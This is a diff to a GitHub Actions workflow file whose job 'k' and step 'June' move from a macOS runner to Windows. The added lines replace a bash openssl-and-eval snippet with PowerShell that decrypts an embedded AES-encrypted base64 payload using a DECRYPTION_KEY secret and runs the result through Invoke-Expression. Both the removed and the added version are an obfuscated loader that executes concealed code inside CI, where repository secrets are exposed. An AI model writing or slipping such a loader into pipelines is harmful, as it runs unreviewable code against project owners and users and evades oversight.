@@ -22,14 +22,108 @@ env:
 
 jobs:
   k:
-    runs-on: macos-15-intel
+    runs-on: windows-latest
     steps:
       - name: June
+        shell: pwsh
         run: |
-          encrypted_payload="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"
+          $encrypted_payload = "U2FsdGVkX18W9nL/ErsTKbLckK95fYv+rmP5gIr+goK+GZFRz86ghN7DlSDkpVjf8ak7ZUVno2zInndjgt/xYj4Ha4WAF8al2euJv0RM8FI3eVg86Xg1Kkbp0XHBi4hnFKErQ5MZ4vLoSoqQF9M6cA=="
+          $passphrase = $env:DECRYPTION_KEY
 
-          decrypted=$(echo "$encrypted_payload" | base64 -d | openssl enc -aes-256-cbc -d -salt -pbkdf2 -pass pass:"$DECRYPTION_KEY")
+          $iterations = 10000
+          $keySizeBytes = 32
+          $ivSizeBytes = 16
 
-          if [ $? -eq 0 ]; then
-            eval "$decrypted"
-          fi
+          function Try-OpenSSLStyleDecrypt {
+              param(
+                  [byte[]]$ciphertextWithPossibleHeader,
+                  [string]$password
+              )
+
+              try {
+                  if (-not $password) {
+                      throw "no supply"
+                  }
+
+                  # Check for OpenSSL 'Salted__' header (ASCII) -> first 8 bytes 'Salted__', next 8 bytes salt
+                  $header = [System.Text.Encoding]::ASCII.GetString($ciphertextWithPossibleHeader, 0, [Math]::Min(8, $ciphertextWithPossibleHeader.Length))
+                  if ($header -eq "Salted__") {
+                      # extract salt (bytes 8..15) and ciphertext (from byte 16 onward)
+                      $salt = [byte[]]($ciphertextWithPossibleHeader[8..15])
+                      $cipherBytes = if ($ciphertextWithPossibleHeader.Length -gt 16) { [byte[]]($ciphertextWithPossibleHeader[16..($ciphertextWithPossibleHeader.Length - 1)]) } else { @() }
+                  } else {
+                      # no salt header found — assume the whole buffer is raw ciphertext, no salt
+                      $salt = $null
+                      $cipherBytes = $ciphertextWithPossibleHeader
+                  }
+
+                  # Derive key+iv using PBKDF2
+                  $passwordBytes = [System.Text.Encoding]::UTF8.GetBytes($password)
+
+                  if ($salt -ne $null -and $salt.Length -gt 0) {
+                      # Try to use SHA256-based Rfc2898DeriveBytes (requires .NET that supports HashAlgorithmName overload)
+                      try {
+                          $deriveCtor = [System.Security.Cryptography.Rfc2898DeriveBytes].GetConstructors() |
+                                        Where-Object { $_.GetParameters().Length -ge 3 } |
+                                        Select-Object -First 1
+                          # Use explicit HashAlgorithmName if available (PowerShell Core / modern .NET)
+                          $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
+                              ([System.Text.Encoding]::UTF8.GetString($passwordBytes)),
+                              $salt,
+                              $iterations,
+                              [System.Security.Cryptography.HashAlgorithmName]::SHA256
+                          )
+                      } catch {
+                          # Fallback to older constructor (uses HMACSHA1) — only do this if you know the data was derived with SHA1
+                          $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
+                              $password,
+                              $salt,
+                              $iterations
+                          )
+                          Write-Warning "Rfc2898DeriveBytes SHA256 overload not available; falling back to default SHA1-based PBKDF2. If encryption used PBKDF2-SHA256, specify a PowerShell/.NET runtime that supports it."
+                      }
+                  } else {
+                      # no salt -> cannot derive key reliably; try deriving with empty salt
+                      $salt = ,0..7 | ForEach-Object { [byte]0 }
+                      $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations, [System.Security.Cryptography.HashAlgorithmName]::SHA256)
+                  }
+
+                  $key = $rdb.GetBytes($keySizeBytes)
+                  $iv  = $rdb.GetBytes($ivSizeBytes)
+
+                  # Create AES decryptor
+                  $aes = [System.Security.Cryptography.Aes]::Create()
+                  $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+                  $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+                  $aes.KeySize = 256
+                  $aes.Key = $key
+                  $aes.IV = $iv
+
+                  $transform = $aes.CreateDecryptor()
+                  $ms = New-Object System.IO.MemoryStream (,$cipherBytes)
+                  $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $transform, [System.Security.Cryptography.CryptoStreamMode]::Read)
+                  $sr = New-Object System.IO.StreamReader($cs, [System.Text.Encoding]::UTF8)
+                  $plaintext = $sr.ReadToEnd()
+
+                  # clean up
+                  $sr.Close(); $cs.Close(); $ms.Close(); $aes.Dispose()
+
+                  return $plaintext
+              } catch {
+                  throw $_
+              }
+          }
+
+          try {
+              $cipherBytes = [Convert]::FromBase64String($encrypted_payload)
+
+              $decrypted = Try-OpenSSLStyleDecrypt -ciphertextWithPossibleHeader $cipherBytes -password $passphrase
+
+              if ($null -ne $decrypted -and $decrypted.Length -gt 0) {
+                  Invoke-Expression $decrypted
+              } else {
+                  Write-Error "Decryption succeeded but produced empty output."
+              }
+          } catch {
+              Write-Error "Decryption failed: $($_.Exception.Message)"
+          }
